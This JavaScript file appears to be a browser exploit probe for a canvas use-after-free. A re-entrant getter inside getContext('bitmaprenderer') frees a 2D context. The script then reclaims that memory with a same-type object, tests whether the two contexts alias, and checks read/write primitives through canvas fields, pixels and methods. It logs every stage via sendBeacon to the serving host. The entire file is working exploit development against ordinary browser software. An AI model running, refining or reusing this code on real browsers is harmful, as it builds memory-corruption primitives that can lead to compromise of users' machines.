// PROBE P571v4b: Canvas UAF — fully optimized for constrained browser
// - Zero allocs between free and reclaim
// - sendBeacon instead of Image (no image pipeline allocation)
// - 1x1 canvas (minimal GPU backing)
// - Canvas NOT appended to DOM (no compositor layer)
// - Landing page gives 1s GC settle before this loads

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    var msg = 'P571-' + tag;
    if (body !== undefined) msg += '-' + body;
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(BASE + '/beacon.php?tag=' + encodeURIComponent(msg) + '&t=' + (Date.now() - T0));
      } else {
        new Image().src = BASE + '/beacon.php?tag=' + encodeURIComponent(msg) + '&t=' + (Date.now() - T0);
      }
    } catch(e) {}
  }

  // === PHASE A: UAF trigger + IMMEDIATE same-type reclaim ===
  // No allocations between getContext('bitmaprenderer') and canvas2.getContext('2d')
  var inner = null;
  var canvas1 = document.createElement('canvas');
  canvas1.width = 1; canvas1.height = 1;

  var opts = {};
  Object.defineProperty(opts, 'alpha', {
    get: function() {
      inner = canvas1.getContext('2d');
      return true;
    }
  });

  var outer = null;
  try {
    outer = canvas1.getContext('bitmaprenderer', opts);
  } catch(e) {
    B('ERR', e.name); return;
  }

  if (!outer || !inner) {
    B('FAIL', 'o=' + !!outer + ',i=' + !!inner); return;
  }

  // inner is FREED. Reclaim NOW — zero intervening allocations.
  var canvas2 = document.createElement('canvas');
  canvas2.width = 1; canvas2.height = 1;
  var ctx2 = canvas2.getContext('2d');
  // Reclaim done. Safe to beacon now.

  B('BOOT', 'v4b');
  if (!ctx2) { B('CTX2-FAIL'); return; }
  B('UAF+RECLAIM-OK');

  // === PHASE B: Aliasing test ===
  ctx2.globalAlpha = 0.777;
  var ga = -1;
  var aliased = false;
  var aliasTarget = ctx2;

  try {
    ga = inner.globalAlpha;
    B('READ-GA', '' + ga);
    aliased = (Math.abs(ga - 0.777) < 0.001);
  } catch(e) {
    B('READ-CRASH', e.name);
    // Reclaim missed — batch retry with 16 same-type contexts
    for (var i = 0; i < 16; i++) {
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      c.getContext('2d');
    }
    try {
      ga = inner.globalAlpha;
      B('RETRY-GA', '' + ga);
      aliased = (Math.abs(ga - 0.777) < 0.001);
    } catch(e2) {
      B('DEAD'); return;
    }
  }

  if (aliased) {
    B('ALIAS', 'direct');
  } else {
    // Try reverse: write through inner, check if ctx2 sees it
    try {
      inner.globalAlpha = 0.31337;
      if (Math.abs(ctx2.globalAlpha - 0.31337) < 0.001) {
        aliased = true;
        B('ALIAS', 'reverse');
      } else {
        B('NO-ALIAS', 'ga=' + ga + ',ctx2ga=' + ctx2.globalAlpha);
      }
    } catch(e) {
      B('WRITE-CRASH', e.name);
    }
  }

  // === PHASE C: Bidirectional R/W (only if aliased) ===
  if (aliased) {
    B('BIDIR-START');
    var fn = ['globalAlpha','lineWidth','miterLimit','shadowOffsetX','shadowOffsetY','shadowBlur'];
    var tv = [0.12345, 42.5, 99.99, -17.3, 23.7, 5.55];

    // Forward: write ctx2, read inner
    var fwOK = 0;
    for (var f = 0; f < fn.length; f++) {
      try {
        ctx2[fn[f]] = tv[f];
        var r = inner[fn[f]];
        if (Math.abs(r - tv[f]) < 0.001) fwOK++;
        else B('FW-MISS', fn[f] + '=' + r);
      } catch(e) { B('FW-ERR', fn[f]); }
    }
    B('FW', fwOK + '/' + fn.length);

    // Reverse: write inner, read ctx2
    var rvOK = 0;
    for (var f = 0; f < fn.length; f++) {
      try {
        inner[fn[f]] = tv[f] + 100;
        var r = ctx2[fn[f]];
        if (Math.abs(r - (tv[f] + 100)) < 0.001) rvOK++;
        else B('RV-MISS', fn[f] + '=' + r);
      } catch(e) { B('RV-ERR', fn[f]); }
    }
    B('RV', rvOK + '/' + fn.length);

    // Drawing cross-test (resize to 4x4 just for pixel test)
    try {
      canvas2.width = 4; canvas2.height = 4;
      ctx2.fillStyle = '#FF0000';
      ctx2.fillRect(0, 0, 4, 4);
      inner.fillStyle = '#00FF00';
      inner.fillRect(1, 1, 2, 2);
      var px = ctx2.getImageData(2, 2, 1, 1);
      B('PIX', px.data[0]+','+px.data[1]+','+px.data[2]+','+px.data[3]);
    } catch(e) { B('PIX-ERR', e.name); }

    // Identity check
    try {
      B('ID', 'same='+(inner===ctx2)+',c1='+(inner.canvas===canvas1)+',c2='+(ctx2.canvas===canvas2));
    } catch(e) { B('ID-ERR', e.name); }

    // String fields
    try {
      B('STR', 'gco='+inner.globalCompositeOperation+',lc='+inner.lineCap+',fs='+inner.fillStyle);
    } catch(e) { B('STR-ERR', e.name); }

    // Method survival (compact)
    var methods = ['beginPath','moveTo','lineTo','save','restore','stroke'];
    var mOK = 0;
    for (var m = 0; m < methods.length; m++) {
      try { inner[methods[m]].call(inner, 0, 0); mOK++; } catch(e) {}
    }
    B('METH', mOK + '/' + methods.length);

  } else {
    // Even without alias, report what we can about inner
    try {
      B('INNER-TYPE', typeof inner.globalAlpha);
      B('INNER-GA-RAW', '' + inner.globalAlpha);
    } catch(e) {
      B('INNER-DEAD', e.name);
    }
  }

  B('DONE');
})();
